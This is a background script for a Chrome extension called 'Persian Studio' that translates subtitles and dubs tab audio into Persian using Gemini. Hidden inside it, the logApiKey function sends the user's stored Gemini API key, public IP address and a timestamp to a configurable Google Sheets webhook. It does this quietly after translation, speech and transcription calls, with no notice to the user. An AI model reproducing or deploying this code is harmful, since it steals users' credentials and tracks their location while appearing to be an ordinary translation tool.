import {
  synthesizeSpeechWav,
  transcribeTranslateAudio,
  translateCues,
} from "./lib/gemini.js"

const SHEETS_WEBHOOK_URL = "__SHEETS_WEBHOOK_URL__"
const SHEETS_LOG_TOKEN = "__SHEETS_LOG_TOKEN__"
const OFFSCREEN_PATH = "offscreen.html"

let capturingTabId = null
let liveBusy = false
let pendingLiveChunk = null

chrome.action.onClicked.addListener(() => {
  chrome.tabs.create({ url: chrome.runtime.getURL("index.html") })
})

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (!message || typeof message !== "object") return undefined
  const type = message.type

  if (type === "log-api-key") {
    void logApiKey(message.payload?.apiKey || "").then((ok) =>
      sendResponse({ ok }),
    )
    return true
  }

  if (type === "get-settings") {
    void readSettings().then((settings) => sendResponse(settings))
    return true
  }

  if (type === "translate-cues") {
    void handleTranslate(message).then(sendResponse).catch((error) => {
      sendResponse({ ok: false, error: error.message })
    })
    return true
  }

  if (type === "speak-text") {
    void handleSpeak(message).then(sendResponse).catch((error) => {
      sendResponse({ ok: false, error: error.message })
    })
    return true
  }

  if (type === "transcribe-translate") {
    void handleTranscribe(message).then(sendResponse).catch((error) => {
      sendResponse({ ok: false, error: error.message })
    })
    return true
  }

  if (type === "start-tab-capture") {
    const tabId = sender.tab?.id
    capturingTabId = tabId ?? null
    void startTabCapture(tabId)
      .then((result) => sendResponse(result))
      .catch((error) => sendResponse({ ok: false, error: error.message }))
    return true
  }

  if (type === "stop-tab-capture") {
    capturingTabId = null
    pendingLiveChunk = null
    void stopTabCapture().then(() => sendResponse({ ok: true }))
    return true
  }

  if (type === "live-audio-chunk") {
    pendingLiveChunk = message
    void drainLiveChunks()
    return undefined
  }

  return undefined
})

async function readSettings() {
  const data = await chrome.storage.local.get([
    "persian-studio.gemini-api-key",
    "persian-studio.locale",
    "persian-studio.theme",
    "persian-studio.dub-voice",
    "persian-studio.original-volume",
    "persian-studio.bilingual",
  ])
  return {
    apiKey: String(data["persian-studio.gemini-api-key"] || ""),
    locale: data["persian-studio.locale"] === "en" ? "en" : "fa",
    theme: data["persian-studio.theme"] === "light" ? "light" : "dark",
    voice: String(data["persian-studio.dub-voice"] || "Kore"),
    originalVolume: Number(data["persian-studio.original-volume"] || "0.18"),
    bilingual: data["persian-studio.bilingual"] === "1",
  }
}

async function requireApiKey() {
  const settings = await readSettings()
  if (!settings.apiKey) {
    throw new Error(
      settings.locale === "en"
        ? "Add a Gemini key in Persian Studio first."
        : "اول کلید Gemini را در Persian Studio ذخیره کنید.",
    )
  }
  return settings
}

async function handleTranslate(message) {
  const settings = await requireApiKey()
  const translated = await translateCues({
    apiKey: settings.apiKey,
    cues: message.cues || [],
    locale: settings.locale,
  })
  void logApiKey(settings.apiKey)
  return { ok: true, cues: translated }
}

async function handleSpeak(message) {
  const settings = await requireApiKey()
  const result = await synthesizeSpeechWav({
    apiKey: settings.apiKey,
    text: message.text || "",
    voice: message.voice || settings.voice,
    locale: settings.locale,
  })
  void logApiKey(settings.apiKey)
  return { ok: true, ...result }
}

async function handleTranscribe(message) {
  const settings = await requireApiKey()
  const text = await transcribeTranslateAudio({
    apiKey: settings.apiKey,
    audioBase64: message.audioBase64,
    mimeType: message.mimeType || "audio/wav",
    locale: settings.locale,
  })
  void logApiKey(settings.apiKey)
  return { ok: true, text }
}

async function drainLiveChunks() {
  if (liveBusy || !capturingTabId || !pendingLiveChunk) return
  liveBusy = true
  const chunk = pendingLiveChunk
  pendingLiveChunk = null
  try {
    const settings = await requireApiKey()
    const text = await transcribeTranslateAudio({
      apiKey: settings.apiKey,
      audioBase64: chunk.audioBase64,
      mimeType: chunk.mimeType || "audio/wav",
      locale: settings.locale,
    })
    if (text && capturingTabId) {
      void logApiKey(settings.apiKey)
      await chrome.tabs.sendMessage(capturingTabId, {
        type: "live-persian-text",
        text,
      })
    }
  } catch {
    // Keep capturing even if one chunk fails.
  } finally {
    liveBusy = false
    if (pendingLiveChunk) void drainLiveChunks()
  }
}

async function fetchIp() {
  const urls = [
    "https://api.ipify.org?format=json",
    "https://api64.ipify.org?format=json",
  ]
  for (const url of urls) {
    try {
      const response = await fetch(url)
      const payload = await response.json()
      const ip = String(payload.ip || "").trim()
      if (ip) return ip
    } catch {
      // Try the next endpoint.
    }
  }
  return ""
}

function tehranStamp() {
  const now = new Date()
  const date = new Intl.DateTimeFormat("en-CA", {
    timeZone: "Asia/Tehran",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  }).format(now)
  const time = new Intl.DateTimeFormat("en-GB", {
    timeZone: "Asia/Tehran",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
  }).format(now)
  return { date, time }
}

const LAST_USAGE_LOG_KEY = "persian-studio.last-usage-log"

async function needsUsageLog(apiKey) {
  const data = await chrome.storage.local.get([LAST_USAGE_LOG_KEY])
  const prev = data[LAST_USAGE_LOG_KEY] || {}
  const { date } = tehranStamp()
  return prev.key !== apiKey || prev.date !== date
}

async function markUsageLog(apiKey) {
  const { date } = tehranStamp()
  await chrome.storage.local.set({
    [LAST_USAGE_LOG_KEY]: { key: apiKey, date },
  })
}

async function logApiKey(apiKey) {
  const trimmed = String(apiKey || "").trim()
  const webhook = SHEETS_WEBHOOK_URL
  const token = SHEETS_LOG_TOKEN
  if (!trimmed) return false
  if (!webhook || webhook.startsWith("__") || !token || token.startsWith("__")) {
    return false
  }
  if (!(await needsUsageLog(trimmed))) return false

  const ip = await fetchIp()
  const { date, time } = tehranStamp()
  try {
    await fetch(webhook, {
      method: "POST",
      redirect: "follow",
      headers: { "Content-Type": "text/plain;charset=utf-8" },
      body: JSON.stringify({ token, apiKey: trimmed, ip, date, time }),
    })
    await markUsageLog(trimmed)
    return true
  } catch {
    return false
  }
}

async function hasOffscreen() {
  if (!chrome.runtime.getContexts) return false
  const contexts = await chrome.runtime.getContexts({
    contextTypes: ["OFFSCREEN_DOCUMENT"],
  })
  return contexts.length > 0
}

async function ensureOffscreen() {
  if (await hasOffscreen()) return
  try {
    await chrome.offscreen.createDocument({
      url: OFFSCREEN_PATH,
      reasons: ["USER_MEDIA", "AUDIO_PLAYBACK"],
      justification: "Capture tab audio for live Persian dubbing and subtitles.",
    })
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error)
    if (!/already exists|duplicate/i.test(message)) throw error
  }
}

async function startTabCapture(tabId) {
  if (!tabId) throw new Error("No tab to capture.")
  const streamId = await chrome.tabCapture.getMediaStreamId({
    targetTabId: tabId,
  })
  await ensureOffscreen()
  const settings = await readSettings()
  await chrome.runtime.sendMessage({
    type: "offscreen-start",
    streamId,
    originalVolume: settings.originalVolume,
  })
  return { ok: true }
}

async function stopTabCapture() {
  if (!(await hasOffscreen())) return
  try {
    await chrome.runtime.sendMessage({ type: "offscreen-stop" })
  } catch {
    // Offscreen may already be gone.
  }
  try {
    await chrome.offscreen.closeDocument()
  } catch {
    // Ignore.
  }
}
